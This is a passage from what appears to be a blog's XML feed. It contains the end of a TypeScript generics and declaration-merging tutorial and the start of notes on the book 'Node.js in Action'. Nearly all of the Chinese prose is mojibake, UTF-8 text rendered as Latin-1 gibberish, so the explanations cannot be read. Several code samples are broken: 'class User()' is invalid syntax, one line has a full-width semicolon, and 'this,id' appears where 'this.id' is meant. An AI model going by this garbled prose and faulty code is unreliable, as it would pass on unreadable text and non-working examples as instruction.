è¿™æ—¶å€™ï¼Œæ³›åž‹å°±æ´¾ä¸Šç”¨å¤„äº†ï¼š 12345678function createArray&lt;T&gt;(length: number,value:T):Array&lt;T&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray&lt;string&gt;(3, 'x');// ['x', 'x', 'x'] ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨å‡½æ•°åŽé¢æ·»åŠ äº† &lt;T&gt;,å…¶ä¸­ Tç”¨æ¥æŒ‡ä»£ä»»æ„è¾“å…¥çš„ç±»åž‹ï¼Œåœ¨åŽé¢çš„è¾“å…¥ valueï¼šTå’Œ è¾“å‡ºçš„ Array&lt;T&gt;ä¸­å³å¯ä½¿ç”¨äº†ã€‚ æŽ¥ç€åœ¨è°ƒç”¨åˆ°æ—¶å€™ï¼Œå¯ä»¥æŒ‡å®šå®ƒå…·ä½“çš„ç±»åž‹ä¸º string,å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸æ‰‹åŠ¨æŒ‡å®šï¼Œè€Œç„¶ç±»åž‹è‡ªåŠ¨æŽ¨ç®—å‡ºæ¥ï¼š 12345678function createArray&lt;T&gt;(length: number,value:T):Array&lt;T&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x');// ['x', 'x', 'x'] å¤šä¸ªç±»åž‹å‚æ•°å®šä¹‰æ³›åž‹çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€æ¬¡å®šä¹‰å¤šä¸ªç±»åž‹å‚æ•°ï¼š 1234function swap&lt;T,U&gt;(tuple:[T,U]):[U,T]&#123; return [tuple[1],tuple[0]]; &#125;swap([7,'seven']); // ['seven',7] ä¸Šé¢æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª swapå‡½æ•°ç”¨æ¥äº¤æ¢è¾“å…¥çš„å…ƒç»„ã€‚ æ³›åž‹çº¦æŸåœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨æ³›åž‹å˜é‡çš„æ—¶å€™ï¼Œç”±äºŽäº‹å…ˆä¸çŸ¥é“å®ƒæ˜¯å“ªç§ç±»åž‹ï¼Œæ‰€ä»¥ä¸èƒ½éšæ„çš„æ“ä½œå®ƒçš„å±žæ€§æˆ–æ–¹æ³•ï¼š 12345function loggingIdentity&lt;T&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125;// error TS2339: Property &apos;length&apos; does not exist on type &apos;T&apos;. ä¸Šä¾‹ä¸­ï¼Œæ³›åž‹ Tä¸ä¸€å®šåŒ…å«å±žæ€§ lengthï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ—¶å€™æŠ¥é”™äº†ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ³›åž‹è¿›è¡Œçº¦æŸï¼Œåªå…è®¸è¿™ä¸ªå‡½æ•°ä¼ å…¥é‚£äº›åŒ…å« lengthå±žæ€§çš„å˜é‡ã€‚è¿™å°±æ˜¯æ³›åž‹çº¦æŸï¼š 1234567interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125; ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ extendsçº¦æŸäº†æ³›åž‹ Tå¿…é¡»ç¬¦åˆæŽ¥å£ Lengthwiseçš„å½¢çŠ¶ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»åŒ…å« lengthå±žæ€§ã€‚ æ­¤æ—¶å¦‚æžœè°ƒç”¨äº† loggingIdentityçš„æ—¶å€™ï¼Œå‡ºå…¥çš„ argä¸åŒ…å« lengthï¼Œé‚£ä¹ˆåœ¨ç¼–è¯‘é˜¶æ®µå°±ä¼šæŠ¥é”™äº†ï¼š 12345678910interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125;loggingIdentity(7);// error TS2345: Argument of type '7' is not assignable to parameter of type 'Lengthwise'. å¤šä¸ªç±»åž‹å‚æ•°ä¹‹é—´ä¹Ÿå¯ä»¥äº’ç›¸çº¦æŸï¼š 123456789function copyFields&lt;T extends U,U&gt;(target: T, source: U):T&#123; for(let id in source)&#123; target[id] = (&lt;T&gt;source)[id]; &#125; return target;&#125;let x = &#123; a: 1, b: 2, c: 3,d: 4 &#125;;copyFields(x,&#123;b:10, d:20&#125;); // &#123;a: 1, b: 10, c: 3, d: 20&#125; ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸¤ä¸ªç±»åž‹å‚æ•°ï¼Œå…¶ä¸­è¦æ±‚ T ç»§æ‰¿ Uï¼Œè¿™æ ·å°±ä¿è¯äº† U ä¸Šä¸ä¼šå‡ºçŽ° T ä¸­ä¸å­˜åœ¨çš„å­—æ®µã€‚ æ³›åž‹æŽ¥å£å¯ä»¥ä½¿ç”¨æŽ¥å£çš„æ–¹å¼æ¥å®šä¹‰ä¸€ä¸ªå‡½æ•°éœ€è¦ç¬¦åˆçš„å½¢çŠ¶ï¼š 12345678interface SearchFunc &#123; (source: string, subString: string): boolean; &#125; let mySearch: SearchFunc; mySearch = function(source: string, subString: string) &#123; return source.search(subString) !== -1; &#125; å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨å«æœ‰æ³›åž‹çš„æŽ¥å£æ¥å®šä¹‰å‡½æ•°çš„å½¢çŠ¶ï¼š 12345678910111213interface CreateArrayFunc &#123; &lt;T&gt;(length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt;&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); è¿›ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ³›åž‹å‚æ•°æå‰åˆ°æŽ¥å£åä¸Šï¼š 12345678910111213interface CreateArrayFunc&lt;T&gt; &#123; (length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc&lt;any&gt;;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt;&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); æ³¨æ„ï¼Œæ­¤æ—¶åœ¨ä½¿ç”¨æ³›åž‹æŽ¥å£çš„æ—¶å€™ï¼Œéœ€è¦å®šä¹‰æ³›åž‹çš„ç±»åž‹ã€‚ æ³›åž‹ç±»ä¸Žæ³›åž‹æŽ¥å£ç±»ä¼¼ï¼Œæ³›åž‹ä¹Ÿå¯ä»¥ç”¨äºŽç±»çš„ç±»åž‹å®šä¹‰ä¸­ï¼š 12345678class GenericNumber&lt;T&gt; &#123; zeroValue: T; add: (x: T, y: T) =&gt; T;&#125;let myGenericNumber = new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue = 0;myGenericNumber.add = function(x,y)&#123;return x + y &#125; æ³›åž‹å‚æ•°çš„é»˜è®¤ç±»åž‹åœ¨ TypeScript 2.3 ä»¥åŽï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ³›åž‹ä¸­çš„ç±»åž‹å‚æ•°æŒ‡å®šé»˜è®¤ç±»åž‹ã€‚å½“ä½¿ç”¨æ³›åž‹æ—¶æ²¡æœ‰åœ¨ä»£ç ä¸­ç›´æŽ¥æŒ‡å®šç±»åž‹å‚æ•°ï¼Œä»Žå®žé™…å€¼å‚æ•°ä¸­ä¹Ÿæ— æ³•æŽ¨æµ‹å‡ºæ—¶ï¼Œè¿™ä¸ªé»˜è®¤ç±»åž‹å°±ä¼šèµ·ä½œç”¨ã€‚ 1234567function createArray&lt;T = string&gt;(length: number, value: T)&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125; å£°ååˆå¹¶å¦‚æžœå®šä¹‰äº†ä¸¤ä¸ªç›¸åŒåå­—çš„å‡½æ•°ã€æŽ¥å£æˆ–ç±»ï¼Œé‚£ä¹ˆå®ƒä»¬ä¼šåˆå¹¶æˆä¸€ä¸ªç±»åž‹ï¼š å‡½æ•°çš„åˆå¹¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é‡è½½å®šä¹‰å¤šä¸ªå‡½æ•°ç±»åž‹ï¼š 123456789function reverse(x:number):number;function reverse(x:string):string;function reverse(x:number|string):number|string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')); &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; æŽ¥å£çš„åˆå¹¶æŽ¥å£ä¸­çš„å±žæ€§åœ¨åˆå¹¶æ—¶ä¼šç®€å•çš„åˆå¹¶åˆ°ä¸€ä¸ªæŽ¥å£ä¸­ï¼š 123456interface Alarm &#123; price: number;&#125;interface Alarm &#123; weight: number;&#125; ç›¸å½“äºŽï¼š 1234interface Alarm &#123; price: number; weight: number;&#125; æ³¨æ„ï¼Œåˆå¹¶çš„å±žæ€§çš„ç±»åž‹å¿…é¡»æ˜¯å”¯ä¸€çš„ 1234567interface Alarm &#123; price: number;&#125;interface Alarm &#123; price: number; // è™½ç„¶é‡å¤äº†ï¼Œä½†æ˜¯ç±»åž‹éƒ½æ˜¯ 'string',ä¸ä¼šæŠ¥é”™ weight: number;&#125; 12345678interface Alarm &#123; price: number;&#125;interface Alarm &#123; price: string; // ç±»åž‹ä¸ä¸€è‡´ï¼ŒæŠ¥é”™ weight: number;&#125;// error TS2717: Subsequent property declarations must have the same type. Property 'price' must be of type 'number', but here has type 'string'. æŽ¥å£ä¸­æ–¹æ³•å’Œåˆå¹¶ï¼Œä¸Žå‡½æ•°çš„åˆå¹¶ä¸€æ ·ã€‚ 12345678interface Alarm &#123; price: number; alert(s: string): string;&#125;interface Alarm &#123; weight: number; alert(s: string, n: number): string;&#125; ç›¸å½“äºŽ 123456interface Alarm &#123; price: number; weight: number; alert(s: string): string; alert(s: string, n: number): string;&#125; ç±»çš„åˆå¹¶ç±»çš„å’Œå¹¶ä¸ŽæŽ¥å£çš„åˆå¹¶è§„åˆ™ä¸€è‡´ ä»£ç æ£€æŸ¥ ç‚¹å‡»è¿™é‡Œ]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” æ¬¢è¿Žè¿›å…¥Nodejsçš„ä¸–ç•Œ]]></title>
    <url>%2F2018-11-28-NodeJs2-Part1.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ æ¬¢è¿Žè¿›å…¥Nodejsçš„ä¸–ç•Œä¸€ä¸ªå…¸åž‹çš„Node Web åº”ç”¨ç¨‹åºå¤§ä½“ä¸Šæ¥è¯´ï¼ŒNodeå’ŒJavaScriptçš„ä¼˜åŠ¿ä¹‹ä¸€æ˜¯å®ƒä»¬çš„å•çº¿ç¨‹ç¼–ç¨‹æ¨¡åž‹ã€‚åœ¨ä¸ºæµè§ˆå™¨ç¼–å†™ä»£ç æ—¶ï¼Œæˆ‘ä»¬å†™çš„æŒ‡ä»¤åºåˆ—ä¸€æ¬¡æ‰§è¡Œä¸€æ¡ï¼Œä»£ç ä¸æ˜¯å¹¶è¡Œæ‰§è¡Œã€‚ç„¶åŽå¯¹äºŽç”¨æˆ·ç•Œé¢æ¥è¯´ï¼Œè¿™æ ·æ˜¯ä¸åˆç†çš„ï¼šæ²¡æœ‰å“ªä¸ªç”¨æˆ·æƒ³åœ¨æµè§ˆå™¨æ‰§è¡Œç½‘ç»œè®¿é—®æˆ–æ–‡ä»¶èŽ·å–è¿™æ ·çš„ä½Žé€Ÿæ“ä½œæ—¶å¹²ç­‰ç€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæµè§ˆå™¨å¼•å…¥äº†äº‹ä»¶æœºåˆ¶ï¼šåœ¨ä½ ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œå°±æœ‰ä¸€ä¸ªäº‹ä»¶è¢«è§¦å‘ï¼Œè¿˜æœ‰ä¸€ä¸ªä¹‹å‰å®šä¹‰çš„å‡½æ•°ä¼šè·‘èµ·æ¥ã€‚è¿™ç§æœºåˆ¶å¯ä»¥è§„é¿ä¸€äº›çº¿ç¨‹ç¼–ç¨‹ä¸­ç»å¸¸å‡ºçŽ°çš„é—®é¢˜ï¼Œæ¯”å¦‚èµ„æºæ­»é”å’Œç«žæ€æ¡ä»¶ã€‚ éžé˜»å¡žI/Oåœ¨æœåŠ¡ç«¯ç¼–ç¨‹ä¸­ï¼Œè®¿é—®ç£ç›˜å’Œç½‘ç»œè¿™æ ·çš„I/Oè¯·æ±‚ä¼šæ¯”è¾ƒæ…¢ã€‚Nodeç”¨ä¸‰ç§æŠ€æœ¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼šæ—¶é—´ã€å¼‚æ­¥APIã€éžé˜»å¡žI/Oã€‚éžé˜»å¡žI/Oæ˜¯åº•å±‚æœ¯è¯­ï¼Œä½ çš„ç¨‹åºå¯ä»¥åœ¨åšå…¶ä»–äº‹ä»¶æ—¶å‘èµ·ä¸€ä¸ªè¯·æ±‚æ¥èŽ·å–ç½‘ç»œèµ„æºï¼Œç„¶åŽå½“ç½‘ç»œæ“ä½œå®Œæˆæ—¶ï¼Œå°†ä¼šè¿è¡Œä¸€ä¸ªå›žè°ƒå‡½æ•°æ¥å¤„ç†è¿™ä¸ªæ“ä½œçš„ç»“æžœã€‚ ä¸Šå›¾å±•ç¤ºäº†ä¸€ä¸ªå…¸åž‹çš„ Node Web åº”ç”¨ç¨‹åºï¼Œå®ƒç”¨Web åº”ç”¨åº“Expressæ¥å¤„ç†å•†åº—çš„è®¢å•æµç¨‹ã€‚ä¸ºäº†è´­ä¹°äº§å“ï¼Œæµè§ˆå™¨å‘èµ·äº†ä¸€ä¸ªè¯·æ±‚ï¼Œç„¶åŽåº”ç”¨ç¨‹åºæ£€æŸ¥åº“å­˜ï¼Œä¸ºç”¨æˆ·åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œå‘å›žæ‰§é‚®ä»¶ï¼Œå¹¶è¿”å›žä¸€ä¸ªJSON HTTP å“åº”ç»™æµè§ˆå™¨ã€‚åŒæ—¶åœ¨åšçš„å…¶ä»–äº‹ä»¶æœ‰ï¼šå‘é€äº†ä¸€å°å›žæ‰§é‚®ä»¶ï¼Œæ›´æ–°äº†æ•°æ®åº“æ¥ä¿å­˜ç”¨æˆ·çš„è¯¦ç»†æ¶ˆæ¯å’Œè®¢å•ã€‚è¿è¡Œå¹³å°æ˜¯å¹¶å‘æ“ä½œçš„ï¼Œå› ä¸ºå®ƒç”¨äº†éžé˜»å¡žI/Oã€‚ æ•°æ®åº“æ˜¯é€šè¿‡ç½‘ç»œè®¿é—®çš„ã€‚Nodeä¸­çš„ç½‘ç»œè®¿é—®ä¹Ÿæ˜¯éžé˜»å¡žçš„ã€‚ç”¨äº† libuv åº“æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„éžé˜»å¡žç½‘ç»œæ“ä½œã€‚åœ¨Linux/macOS/Windows ä¸­çš„å®žçŽ°æ—¶ä¸åŒçš„ï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ä¼šæ“ä½œæ•°æ®åº“çš„ JavaScript åº“å°±å¥½äº†ã€‚ä¾‹å¦‚ 1db.insert(query,err =&gt; &#123;&#125;); ç„¶åŽï¼ŒNode å°±ä¼šå¸®ä½ å®Œæˆé‚£äº›ç»è¿‡é«˜åº¦ä¼˜åŒ–çš„éžé˜»å¡žç½‘ç»œæ“ä½œã€‚ è®¿é—®ç¡¬ç›˜ä¹Ÿå·®ä¸å¤šï¼Œä½†åˆä¸å®Œå…¨ä¸€æ ·ã€‚åœ¨ç”Ÿæˆäº†å›žæ‰§é‚®ä»¶å¹¶ä»Žç¡¬ç›˜ä¸­è¯»å–é‚®ä»¶æ¨¡æ¿æ—¶ï¼Œlibuvå€ŸåŠ©çº¿ç¨‹æ± æ¨¡æ‹Ÿå‡ºäº†ä¸€ç§ä½¿ç”¨éžé˜»å¡žè°ƒç”¨çš„å‡è±¡ã€‚ç®¡ç†çº¿ç¨‹æ± æ˜¯ä¸ªè‹¦å·®äº‹ï¼Œæƒ³è¾ƒè€Œè¨€ï¼Œ 1email.send('template.ejs',(err,html) =&gt; &#123;&#125;); ä¸Šé¢è¿™æ ·çš„ä»£ç å°±è¦å®¹æ˜“ç†è§£å¾—å¤šäº†ã€‚ åœ¨è¿›è¡Œé€Ÿåº¦è¾ƒæ…¢çš„å¤„ç†æ—¶è®©Nodeèƒ½å¤Ÿåšå…¶ä»–äº‹æƒ…ï¼Œæ˜¯ä½¿ç”¨å¸¦éžé˜»å¡žI/Oçš„å¼‚æ­¥APIçœŸæ­£çš„å¥½å¤„ï¼Œå³ä½¿ä½ åªæœ‰ä¸€ä¸ªå•çº¿ç¨‹ã€å•çº¿ç¨‹çš„Node Web åº”ç”¨ï¼Œå®ƒä¹Ÿå¯ä»¥åŒæ—¶å¤„ç†ä¸Šåƒä¸ªç½‘ç»œè®¿å®¢å‘èµ·çš„è¿žæŽ¥ã€‚è¦çŸ¥é“Nodeæ˜¯æ€Žä¹ˆåšåˆ°çš„ï¼Œå¾—å…ˆç ”ç©¶ä¸€ä¸‹äº‹ä»¶è½®è¯¢ã€‚ äº‹ä»¶è½®è¯¢ä»”ç»†ç ”ç©¶ä¸Šå›¾çš„â€œå“åº”æµè§ˆå™¨çš„è¯·æ±‚â€çš„é‚£éƒ¨åˆ†ã€‚åœ¨è¿™ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼ŒNodeå†…ç½®äº†HTTPæœåŠ¡å™¨åº“ï¼Œå³æ ¸å¿ƒæ¨¡å— http.server ï¼Œè´Ÿè´£ç”¨æµã€äº‹ä»¶ã€Nodeçš„HTTPè¯·æ±‚è§£æžå™¨çš„ç»„åˆæ¥å¤„ç†è¯·æ±‚ï¼Œæ˜¯æœ¬åœ°ä»£ç ã€‚å¯ä»¥ä½¿ç”¨Express Web åº”ç”¨åº“æ·»åŠ çš„å›žè°ƒå‡½æ•°ï¼Œä¹Ÿæ˜¯ç”±å®ƒè§¦å‘çš„ã€‚è¿™ä¸ªå›žè°ƒå‡½æ•°åˆä¼šè§¦å‘æ•°æ®æŸ¥è¯¢è¯­å¥ï¼Œæœ€ç»ˆåº”ç”¨ç¨‹åºä¼šç”¨ HTTP å‘é€ JSON ä½œä¸ºå“åº”ã€‚æ•´ä¸ªè¿‡ç¨‹ç”¨äº†ä¸‰ä¸ªéžé˜»å¡žç½‘ç»œè°ƒç”¨ï¼šä¸€ä¸ªç”¨äºŽè¯·æ±‚ï¼Œä¸€ä¸ªç”¨äºŽæ•°æ®åº“ï¼Œè¿˜æœ‰ä¸€ä¸ªç”¨äºŽå“åº”ã€‚Node æ˜¯å¦‚ä½•è°ƒç”¨è¿™äº›ç½‘ç»œæ“ä½œçš„å‘¢ï¼Ÿç”±äº‹ä»¶è½®è¯¢ï¼ˆevent loopï¼‰ã€‚ä¸‹å›¾å±•ç¤ºäº†å¦‚ä½•ç”¨äº‹ä»¶è½®è¯¢å®Œæˆè¿™ä¸‰ä¸ªç½‘ç»œæ“ä½œã€‚ äº‹ä»¶è½®è¯¢æ˜¯å•å‘è¿è¡Œçš„å…ˆå…¥å…ˆå‡ºé˜Ÿåˆ—ï¼Œå®ƒè¦ç»è¿‡å‡ ä¸ªé˜¶æ®µï¼Œè½®è¯¢ä¸­æ¯ä¸ªè¿­ä»£éƒ½è¦è¿è¡Œçš„é‡è¦é˜¶æ®µåœ¨ä¸Šå›¾å±•ç¤ºå‡ºæ¥äº†ã€‚é¦–å…ˆæ˜¯è®¡æ—¶å™¨å¼€å§‹æ‰§è¡Œï¼Œè¿™äº›è®¡æ—¶å™¨éƒ½æ˜¯ç”¨ JavaScript å‡½æ•° setTimeout å’Œ setInterval å®‰æŽ’å¥½çš„ã€‚æŽ¥ä¸‹æ¥æ˜¯è¿è¡Œ I/O å›žè°ƒï¼Œå³è§¦å‘ä½ çš„å›žè°ƒå‡½æ•°ã€‚è½®è¯¢é˜¶æ®µä¼šåŽ»èŽ·å–æ–°çš„I/Oäº‹ä»¶ï¼Œæœ€åŽæ˜¯ç”¨ setImmediate å®‰æŽ’å›žè°ƒã€‚è¿™æ˜¯ä¸€ä¸ªç‰¹ä¾‹ï¼Œå› ä¸ºå®ƒå…è®¸ä½ å°†å›žè°ƒå®‰æŽ’åœ¨å½“å‰é˜Ÿåˆ—ä¸­çš„I/Oå›žè°ƒå®Œæˆä¹‹åŽç«‹å³æ‰§è¡Œã€‚ ES2105ã€Nodeå’ŒV8ä»ŽNode6å¼€å§‹å¯ä»¥ä½¿ç”¨é»˜è®¤å‡½æ•°å‚æ•°ã€å‰©ä½™å‚æ•°ã€spreadæ“ä½œç¬¦ã€forâ€¦ofå¾ªçŽ¯ã€æ¨¡å—å­—ç¬¦ä¸²ã€ç»“æž„ã€ç”Ÿæˆå™¨ç­‰å¾ˆå¤šæ–°ç‰¹å¾ã€‚ç‚¹å‡»è¿™é‡Œ æŸ¥çœ‹Nodeæ”¯æŒçš„ES2015ç‰¹æ€§ã€‚ åœ¨ES5åŠä¹‹å‰ï¼Œæˆ‘ä»¬ä½¿ç”¨ prototype å¯¹è±¡æ¥åˆ›å»ºç±»ä¼¼ç±»çš„ç»“æž„ï¼š 123456function User()&#123; // æž„é€ å™¨&#125;User.prototype.method = function()&#123; // æ–¹æ³•&#125; Node6å’ŒES2015ï¼Œå†™æˆ 1234class User()&#123; constructor()&#123;&#125; method()&#123;&#125;&#125; Nodeè¿˜æ”¯æŒäº†å­ç±»ã€è¶…ç±»å’Œé™æ€æ–¹æ³•ã€‚ const å’Œ let æ˜¯ä»ŽNode 4 å¼€å§‹æ”¯æŒçš„ã€‚Node è¿˜æœ‰åŽŸç”Ÿçš„ promise å’Œ ç”Ÿæˆå™¨ã€‚ 1[1,2,3].map(n =&gt; n*2).filter(n =&gt; n &gt; 3) ç”Ÿæˆå™¨èƒ½æŠŠå¼‚æ­¥I/Oå˜æˆåŒæ­¥ç¼–ç¨‹åˆ†éš”ã€‚Koa Web åº”ç”¨åº“ä¸­ç”¨åˆ°äº†ç”Ÿæˆå™¨ã€‚Koaä½¿ç”¨promise å’Œå…¶ä»–ç”Ÿæˆå™¨å°±å¯ä»¥æŠ›å¼€å±‚å±‚åµŒå¥—çš„å›žè°ƒï¼Œåœ¨å€¼ä¸Š yieldã€‚ ES2105çš„æ¨¡æ¿å­—ç¬¦ä¸²åœ¨Nodeä¸­ä¹Ÿéžå¸¸å¥½ç”¨ã€‚ 123456this.body = ` &lt;div&gt; &lt;h1&gt;Hello&lt;/h1&gt; &lt;p&gt;Welcome,$&#123;user.name&#125;!&lt;/p&gt; &lt;/div&gt;` ç®­å¤´å‡½æ•°ï¼Œåœ¨Nodeä¸­ï¼Œä¸€èˆ¬éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œå› ä¸ºå›žè°ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°é€šå¸¸æ˜¯é”™è¯¯å¯¹è±¡ï¼Œè¿™æ—¶å€™éœ€è¦ç”¨æ‹¬å·æŠŠå‚æ•°æ‹¬èµ·æ¥ 12const fs = require('fs');fs.readFile('package.json',(err,text) =&gt; console.log('Length:',text.length)); åœ¨ES5åŠä¹‹å‰çš„ç‰ˆæœ¬çš„è¯­è¨€ä¸­ï¼Œåœ¨å‡½æ•°ä¸­å®šä¹‰å‡½æ•°ä¼šæŠŠ this å¼•ç”¨å˜æˆå…¨å±€å¯¹è±¡ã€‚å› ä¸ºè¿™ä¸ªé—®é¢˜ï¼Œä¸‹é¢æŒ‰ES5å†™çš„ç±»å®¹æ˜“å‡ºé”™ 1234567891011function User(id)&#123; // æž„é€ å™¨ this.id = id;&#125;User.prototype.load = function()&#123; var self = this; var query = 'SELECT * FROM users WHERE id = ?'ï¼› sql.query(query,this,id,function(err,users)&#123; self.name = users[0].name; &#125;);&#125; ç»™ self.name èµ‹å€¼é‚£è¡Œä»£ç ä¸èƒ½å†™æˆ this.name ã€‚å› ä¸ºè¿™ä¸ªå‡½æ•°çš„ this æ˜¯å…¨å±€å˜é‡ã€‚å¸¸ç”¨çš„è§£å†³åŠžæ³•å°±æ˜¯åœ¨å‡½æ•°çš„å…¥å£å°† this èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œä½†ç®­å¤´å‡½æ•°çš„ç»‘å®šæ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚ 1234567891011class User &#123; constructor(id)&#123; this.id = id; &#125; load()&#123; const query = 'SELECT * FROM users WHERE id = ?'; sql.query(query,this.id,(err,users) =&gt;&#123; this.name = users[0].name; &#125;) &#125;&#125; Node ä¸Ž V8Node çš„åŠ¨åŠ›æºè‡ª V8 JavaScript å¼•æ“Žï¼Œæ˜¯ç”±æœåŠ¡äºŽ Google Chrome çš„ Chromiun é¡¹ç›®ç»„å¼€å‘çš„ã€‚V8 çš„ä¸€ä¸ªå€¼å¾—ç§°é“çš„ç‰¹æ€§æ˜¯å®ƒä¼šè¢« JavaScript ç›´æŽ¥ç¼–è¯‘æˆæœºå™¨ç ï¼Œå¦å¤–å®ƒè¿˜æœ‰ä¸€äº›ä»£ç ä¼˜åŒ–ç‰¹æ€§ï¼Œæ‰€ä»¥Node æ‰ä¼šè¿™ä¹ˆå¿«ã€‚ Nodeçš„å¦ä¸€ä¸ªæœ¬åœ°éƒ¨ä»¶ libuv ï¼Œæ˜¯è´Ÿè´£å¤„ç†I/Oã€‚V8è´Ÿè´£ JavaScript ä»£ç çš„è§£é‡Šå’Œæ‰§è¡Œã€‚ç”¨C++ç»‘å®šå±‚å¯å°† libuv å’Œ V8 ç»“åˆèµ·æ¥ã€‚ ä½¿ç”¨ç‰¹æ€§ç»„Node åŒ…å«äº†V8æä¾›çš„ES2015ç‰¹æ€§ã€‚è¿™äº›ç‰¹æ€§åˆ†ä¸ºshippingã€staged å’Œ in progress ä¸‰ç»„ã€‚shipping ç»„ä»¶çš„ç‰¹æ€§æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œstaged å’Œ in progress ç»„çš„ç‰¹æ€§åˆ™éœ€è¦ç”¨å‘½ä»¤è¡Œå‚æ•°å¼€å¯ã€‚å¦‚æžœæƒ³ä½¿ç”¨ staged ç‰¹æ€§ï¼Œå¯ä»¥åœ¨è¿è¡Œ Node æ—¶åŠ ä¸Šå‚æ•° â€“harmonyã€‚in progress ç‰¹æ€§ç¨³å®šæ€§è¾ƒå·®ï¼Œéœ€è¦å…·ä½“çš„ç‰¹æ€§å‚æ•°æ¥å¼€å¯ã€‚ 1node --v8-option | grep "in progress" ä¸Šé¢æŒ‡ä»¤å¯ä»¥æ¥æŸ¥è¯¢å½“å‰å¯ç”¨çš„ â€in progressâ€œ ç‰¹æ€§ã€‚ä¸åŒç‰ˆæœ¬æ‰§è¡ŒåŽçš„ç»“æžœä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ äº†è§£ Node çš„å‘å¸ƒè®¡åˆ’Nodeçš„å‘è¡Œç‰ˆåˆ†ä¸ºé•¿æœŸæ”¯æŒç‰ˆï¼ˆLTSï¼‰ã€å½“å‰ç‰ˆå’Œæ¯æ—¥æž„å»ºç‰ˆä¸‰ç»„ã€‚æœ‰äº›äººå¯èƒ½å–œæ¬¢æ›´æ–°ä¸é‚£ä¹ˆé¢‘ç¹çš„ LTSï¼Œå¯¹äºŽé‚£äº›éš¾ä»¥ç®¡ç†é¢‘ç¹æ›´æ–°çš„å¤§å…¬å¸æ¥è¯´ï¼Œè¿™ä¸ªç‰ˆæœ¬å¯èƒ½æ›´å¥½ã€‚ä½†å¦‚æžœä½ æƒ³è·Ÿä¸Šæ€§èƒ½å’ŒåŠŸèƒ½çš„æ”¹è¿›ï¼Œå½“å‰ç‰ˆæ›´åˆé€‚ã€‚ å®‰è£… Nodeä½ å¯ä»¥ç›´æŽ¥ä¸Šå®˜ç½‘ä¸‹è½½å¯¹ç”¨çš„æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬ã€‚è¿™é‡Œæˆ‘ä¸ªäººç”¨çš„æ˜¯ nvm ç‰ˆæœ¬ç®¡ç†ï¼Œè‡ªç”±åˆ‡æ¢ç‰ˆæœ¬ã€‚æœ‰å…´è¶£å¯ä»¥ç‚¹å‡»äº†è§£ Node è‡ªå¸¦çš„å·¥å…·Node è‡ªå¸¦äº†ä¸€ä¸ªåŒ…ç®¡ç†å™¨ï¼Œä»¥åŠä»Žæ–‡ä»¶å’Œç½‘ç»œ I/O åˆ° zlib åŽ‹ç¼©ç­‰æ— æ‰€ä¸åŒ…çš„æ ¸å¿ƒ JavaScriptæ¨¡å—ï¼Œè¿˜æœ‰ä¸€ä¸ªè°ƒè¯•å™¨ã€‚npm åŒ…ç®¡ç†å™¨æ˜¯è¿™ä¸ªåŸºç¡€è®¾æ–½ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ† npmå‘½ä»¤è¡Œå·¥å…· npmæ˜¯ç”¨ npm è°ƒç”¨çš„ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥å®‰è£… 